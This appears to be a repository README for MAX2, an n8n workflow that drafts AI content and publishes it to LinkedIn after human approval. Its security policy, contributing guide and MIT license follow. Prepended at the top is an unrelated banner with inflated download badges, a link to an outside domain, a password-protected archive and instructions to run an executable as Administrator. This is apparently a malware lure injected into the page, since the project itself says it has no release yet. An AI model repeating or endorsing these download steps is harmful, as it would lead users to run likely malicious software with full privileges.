<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# MAX2 AI Content Automation

MAX2 is an open-source, human-in-the-loop AI content automation workflow for creating, reviewing, approving, and publishing professional content.

It connects **Notion → n8n → AI content generation → visual/infographic generation → Telegram approval → LinkedIn publishing → Notion status update**.

> **Project status:** Active development / early open-source release.

## Why MAX2?

AI can accelerate content creation, but fully autonomous publishing is often the wrong trade-off. MAX2 keeps a human approval step before publication while automating the repetitive work around research, drafting, visuals, routing, and status tracking.

The project is designed to be:
- Free-first during development and testing
- Modular and provider-agnostic where practical
- Friendly to non-technical and semi-technical users
- Suitable for Arabic and English content
- Reusable as an n8n workflow/template

## Core Features

- Notion-based content queue and control center
- AI-assisted post drafting
- Arabic and English content paths
- Text-only, image, or infographic publishing modes
- Optional AI-assisted visual choice
- Telegram human review and Approve/Reject routing
- LinkedIn publishing after approval
- Automatic Notion status updates
- Modular AI/image provider integration
- No credentials stored in the repository

## Repository Structure

```text
MAX2-AI-Content-Automation/
├── README.md
├── LICENSE
├── CONTRIBUTING.md
├── SECURITY.md
├── CODE_OF_CONDUCT.md
├── .env.example
├── .gitignore
├── docs/
│   ├── ARCHITECTURE.md
│   ├── SETUP.md
│   ├── NOTION_SCHEMA.md
│   ├── SECURITY_GUIDE.md
│   └── ROADMAP.md
├── workflows/
│   └── README.md
└── .github/
    ├── ISSUE_TEMPLATE/
    │   ├── bug_report.md
    │   └── feature_request.md
    └── pull_request_template.md
```

## Quick Start

1. Install or create an n8n instance.
2. Create a Notion database using the suggested schema in `docs/NOTION_SCHEMA.md`.
3. Create a Telegram bot for human approval.
4. Configure your chosen AI text and visual providers.
5. Configure LinkedIn publishing credentials/integration.
6. Add credentials securely inside n8n or environment variables — never commit secrets.
7. Import the sanitized MAX2 n8n workflow when available in `workflows/`.
8. Test the complete flow with a draft/test post before enabling real publishing.

## Workflow Export

The production workflow contains integration-specific configuration and must be sanitized before publication. A credential-free n8n JSON export will be added to `workflows/` after the public-release security review.

This repository intentionally does **not** include private API keys, access tokens, Telegram secrets, LinkedIn credentials, or private Notion identifiers.

## Roadmap

Near-term priorities include:
- Publish sanitized n8n workflow JSON
- Improve setup documentation
- Add configurable content modes
- Improve provider abstraction
- Add validation and failure handling
- Add reusable prompt templates
- Add example Notion template/schema
- Add community-contributed integrations


---

# Security Policy

## Reporting a vulnerability

Please do not publish API keys, access tokens, webhook secrets, credentials, or exploitable private configuration in a public issue.

For security-sensitive findings, contact the repository maintainer privately through the contact method listed on the maintainer's GitHub profile.

## Secrets

MAX2 must never store real secrets in Git.

If a secret is accidentally committed:
1. Revoke/rotate it immediately.
2. Remove it from the repository and Git history where necessary.
3. Review connected services for unauthorized activity.

See `docs/SECURITY_GUIDE.md`.


---

# Contributing to MAX2

Thanks for your interest in MAX2.

## Ways to contribute

You can help by:
- Reporting bugs
- Improving documentation
- Suggesting integrations
- Improving workflow reliability
- Adding reusable prompt patterns
- Testing Arabic/English content flows
- Improving security and credential handling

## Development principles

1. Keep the workflow understandable.
2. Prefer modular integrations over hard-coded providers.
3. Preserve the human approval layer for publishing flows.
4. Never include real credentials or private identifiers.
5. Document behavior changes.

## Pull requests

Before opening a pull request:
- Remove all secrets and personal data.
- Test the changed workflow path.
- Explain what changed and why.
- Include setup/documentation changes when necessary.

For exported n8n workflows, confirm that credentials, webhook secrets, database IDs, chat IDs, access tokens, and private URLs have been removed.


---

MIT License

Copyright (c) 2026 MAX2 contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
